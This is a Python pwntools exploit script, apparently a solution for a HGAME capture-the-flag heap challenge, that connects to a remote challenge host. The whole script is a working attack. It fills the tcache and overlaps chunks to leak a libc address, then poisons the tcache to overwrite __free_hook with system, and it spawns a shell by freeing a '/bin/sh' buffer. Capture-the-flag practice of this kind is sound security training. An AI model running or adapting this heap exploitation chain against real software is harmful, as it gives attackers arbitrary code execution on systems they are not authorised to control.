from pwn import *
#context.log_level='debug'
context.arch='amd64'

def add_c(index,size,content):
	r.recvuntil(b"Your choice:")
	r.send(b"\x01\x00\x00\x00")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	r.recvuntil(b"Size: ")
	r.sendline(str(size))
	r.recvuntil(b"Content: ")
	r.send(content)	
	return
def show_c(index):
	r.recvuntil(b"Your choice:")
	r.send(b"\x03\x00\x00\x00")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	return
def del_c(index):
	r.recvuntil(b"Your choice:")
	r.send(b"\x02\x00\x00\x00")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))


#r=process("./pwn")
r=remote("node1.hgame.vidar.club",31158)
#gdb.attach(r)
pause()
add_c(0,0x88,b"a"*0x80+p64(0x90))
add_c(1,24,b"bbbb")
add_c(2,24,b"bbbb")
add_c(3,248,b"bbbb")

add_c(4,248,b"cccc")
add_c(5,248,b"cccc")
add_c(6,248,b"cccc")
add_c(7,248,b"cccc")
add_c(8,248,b"cccc")
add_c(9,248,b"cccc")
add_c(10,248,b"cccc")
del_c(4)
del_c(5)
del_c(6)
del_c(7)
del_c(8)
del_c(9)
del_c(10)

add_c(4,0x80,b"cccc")
add_c(5,0x80,b"cccc")
add_c(6,0x80,b"cccc")
add_c(7,0x80,b"cccc")
add_c(8,0x80,b"cccc")
add_c(9,0x80,b"cccc")
add_c(10,0x80,b"cccc")

del_c(4)
del_c(5)
del_c(6)
del_c(7)
del_c(8)
del_c(9)
del_c(10)

del_c(0)
del_c(2)
add_c(2,24,b"bbbb".ljust(16,b"\x00")+p64(0xD0))
del_c(3) 

add_c(4,0x80,b"cccc")
add_c(5,0x80,b"cccc")
add_c(6,0x80,b"cccc")
add_c(7,0x80,b"cccc")
add_c(8,0x80,b"cccc")
add_c(9,0x80,b"cccc")
add_c(10,0x80,b"cccc")
add_c(0,0x80,b'a')
del_c(4)
del_c(5)
del_c(6)
del_c(7)
del_c(8)
del_c(9)
del_c(10)



show_c(1)
main_area=u64(r.recv(6).ljust(8,b'\x00'))
libc_base=main_area-0x3EBCA0
malloc_hook=main_area-0x70
print(hex(libc_base))
free_hook=0
fake_chunk_add=malloc_hook-0x23
print(hex(malloc_hook))



add_c(12,0x30,b'a')
add_c(13,0x30,b'a')

add_c(4,0x30,b"cccc")
add_c(5,0x30,b"cccc")
add_c(6,0x30,b"cccc")
add_c(7,0x30,b"cccc")
add_c(8,0x30,b"cccc")
add_c(9,0x30,b"cccc")
add_c(10,0x30,b"cccc")

del_c(4)
del_c(5)
del_c(6)
del_c(7)
del_c(8)
del_c(9)
del_c(10)


del_c(1)
del_c(13)
del_c(12)

#print("b1")
#pause()

add_c(4,0x30,b"cccc")
add_c(5,0x30,b"cccc")
add_c(6,0x30,b"cccc")
add_c(7,0x30,b"cccc")
add_c(8,0x30,b"cccc")
add_c(9,0x30,b"cccc")
add_c(10,0x30,b"cccc")

#print("b2")
#pause()

libc=ELF("./libc-2.27.so")
re_add=libc.sym["realloc"]+libc_base
free_hook=libc.sym["__free_hook"]+libc_base
print(hex(free_hook))
add_c(1,0x30,p64(free_hook))
add_c(12,0x30,b'a')

#print("b3")
#pause()

add_c(13,0x30,b'a')

sys_add=libc.sym["system"]+libc_base
add_c(14,0x30,p64(sys_add))

print("b4")
pause()
add_c(15,0x90,b'/bin/sh\x00')
del_c(15)

print(hex(libc_base))
r.interactive()
